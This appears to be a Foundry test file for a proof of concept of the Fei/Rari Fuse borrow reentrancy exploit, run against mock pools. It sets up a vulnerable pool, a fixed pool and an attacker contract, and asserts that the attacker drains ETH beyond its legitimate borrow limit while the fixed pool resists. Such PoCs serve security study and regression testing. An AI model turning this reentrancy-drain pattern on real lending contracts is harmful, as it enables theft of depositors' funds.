// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/Exploit.sol";

/// @title Fei/Rari Fuse PoC â€” Compound-Fork Borrow Reentrancy
/// @notice Demonstrates reentrancy in ETH borrow function of a Compound-fork pool
contract FeiRariExploitTest is Test {
    MockToken public collateral;
    VulnerableFusePool public pool;
    FixedFusePool public fixedPool;
    FuseAttacker public attacker;

    address public depositor = makeAddr("depositor");
    address public attackerEOA = makeAddr("attackerEOA");

    uint256 constant POOL_ETH = 100 ether;
    uint256 constant ATTACKER_COLLATERAL = 10 ether; // 10 ETH worth of collateral tokens

    function setUp() public {
        collateral = new MockToken("USDC");
        pool = new VulnerableFusePool(address(collateral));
        fixedPool = new FixedFusePool(address(collateral));
        attacker = new FuseAttacker(address(pool));

        // Fund pool with ETH reserves
        vm.deal(address(this), POOL_ETH * 2);
        pool.fundPool{value: POOL_ETH}();
        fixedPool.fundPool{value: POOL_ETH}();

        // Give attacker collateral tokens and deposit
        collateral.mint(address(attacker), ATTACKER_COLLATERAL);
        vm.startPrank(address(attacker));
        collateral.approve(address(pool), ATTACKER_COLLATERAL);
        pool.depositCollateral(ATTACKER_COLLATERAL);
        vm.stopPrank();
    }

    function test_normalBorrow() public {
        // Normal user deposits collateral and borrows within limits
        collateral.mint(depositor, 10 ether);
        vm.startPrank(depositor);
        collateral.approve(address(pool), 10 ether);
        pool.depositCollateral(10 ether);

        // Can borrow up to 75% of collateral
        pool.borrow(7.5 ether);
        vm.stopPrank();

        assertEq(pool.ethBorrowed(depositor), 7.5 ether);
        assertEq(depositor.balance, 7.5 ether);
    }

    function test_exploit_reentrancy() public {
        uint256 poolBefore = address(pool).balance;
        uint256 maxLegitBorrow = (ATTACKER_COLLATERAL * 7500) / 10000; // 7.5 ETH

        emit log_named_decimal_uint("Pool ETH before", poolBefore, 18);
        emit log_named_decimal_uint("Attacker collateral", ATTACKER_COLLATERAL, 18);
        emit log_named_decimal_uint("Max legitimate borrow", maxLegitBorrow, 18);

        // Attack: borrow with reentrancy
        vm.prank(address(attacker));
        attacker.attack(maxLegitBorrow);

        uint256 poolAfter = address(pool).balance;
        uint256 attackerBal = address(attacker).balance;

        emit log("=== Fei/Rari Exploit Result ===");
        emit log_named_decimal_uint("Pool ETH after", poolAfter, 18);
        emit log_named_decimal_uint("Attacker received", attackerBal, 18);
        emit log_named_uint("Reentrancy count", attacker.reentrancyCount());

        // Attacker should have received MORE than their max borrow
        assertTrue(attackerBal > maxLegitBorrow, "Attacker should exceed max borrow via reentrancy");
        assertTrue(poolAfter < poolBefore - maxLegitBorrow, "Pool drained beyond legitimate amount");
    }

    function test_fixed_noReentrancy() public {
        // Setup attacker on fixed pool
        collateral.mint(attackerEOA, ATTACKER_COLLATERAL);
        vm.startPrank(attackerEOA);
        collateral.approve(address(fixedPool), ATTACKER_COLLATERAL);
        fixedPool.depositCollateral(ATTACKER_COLLATERAL);

        uint256 maxBorrow = (ATTACKER_COLLATERAL * 7500) / 10000;
        fixedPool.borrow(maxBorrow);
        vm.stopPrank();

        // Should only get legitimate amount
        assertEq(attackerEOA.balance, maxBorrow, "Fixed: should only get legitimate borrow amount");
    }
}
